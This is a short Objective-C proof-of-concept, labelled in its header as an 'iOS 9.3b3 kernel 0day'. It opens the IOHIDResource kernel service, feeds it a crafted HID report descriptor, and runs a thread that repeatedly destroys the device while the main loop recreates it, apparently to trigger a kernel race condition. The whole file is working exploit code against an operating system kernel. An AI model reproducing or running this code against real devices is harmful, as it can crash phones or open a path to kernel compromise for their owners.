/* 
   iOS 9.3b3 kernel 0day 
   by ~qwertyoruiop
*/


#import <IOKit/IOKitLib.h>
#import <pthread.h>

extern "C" CFDataRef IOCFSerialize( CFTypeRef object, CFOptionFlags options );

char desct[] = {
    0x05,0x0d,0x09,0x04,0xa1,0x01,0x85,0x01,0x09,0x22,0xa1,0x02,0x09,0x42,0x15,0x00,0x25,0x01,0x75,0x01,0x95,0x01,0x81,0x02,0x09,0x32,0x81,0x02,0x09,0x47,0x81,0x02,0x95,0x05,0x81,0x03,0x75,0x08,0x09,0x51,0x95,0x01,0x81,0x02,0x05,0x01,0x26,0xff,0x7f,0x75,0x10,0x55,0x00,0x65,0x00,0x09,0x30,0x35,0x00,0x46,0x00,0x00,0x81,0x02,0x09,0x31,0x46,0x00,0x00,0x81,0x02,0xc0,0xa1,0x02,0x05,0x0d,0x09,0x42,0x15,0x00,0x25,0x01,0x75,0x01,0x95,0x01,0x81,0x02,0x09,0x32,0x81,0x02,0x09,0x47,0x81,0x02,0x95,0x05,0x81,0x03,0x75,0x08,0x09,0x51,0x95,0x01,0x81,0x02,0x05,0x01,0x26,0xff,0x7f,0x75,0x10,0x55,0x00,0x65,0x00,0x09,0x30,0x35,0x00,0x46,0x00,0x00,0x81,0x02,0x09,0x31,0x46,0x00,0x00,0x81,0x02,0xc0,0x05,0x0d,0x09,0x54,0x95,0x01,0x75,0x08,0x15,0x00,0x25,0x08,0x81,0x02,0x09,0x55,0xb1,0x02,0xc0,
};

void go(io_connect_t conn) {
    while (1) {
        IOConnectCallMethod(conn, 1, 0, 0, 0, 0, 0, 0, 0, 0);
    }
}

int main(int argc, char **argv, char **envp) {
    io_iterator_t iterator;
    IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("IOHIDResource"), &iterator);
    io_service_t svc = IOIteratorNext(iterator);
    io_connect_t conn;
    assert(KERN_SUCCESS == IOServiceOpen(svc, mach_task_self(), 0, &conn));
    CFDataRef desc = IOCFSerialize((CFTypeRef)@{ @"ReportDescriptor": [NSData dataWithBytes:&desct[0] length:sizeof(desct)]}, 0);
    uint64_t n = 0;
    
    pthread_t t;
    pthread_create(&t, NULL, (void *(*)(void *)) go, (void*) (uint64_t)conn);

    while (1) {
        kern_return_t kr = IOConnectCallMethod(conn, 0, &n, 1, CFDataGetBytePtr(desc), CFDataGetLength(desc), 0, 0, 0, 0);
        kr = IOConnectCallMethod(conn, 1, 0, 0, 0, 0, 0, 0, 0, 0);
    }
    return 0;
}
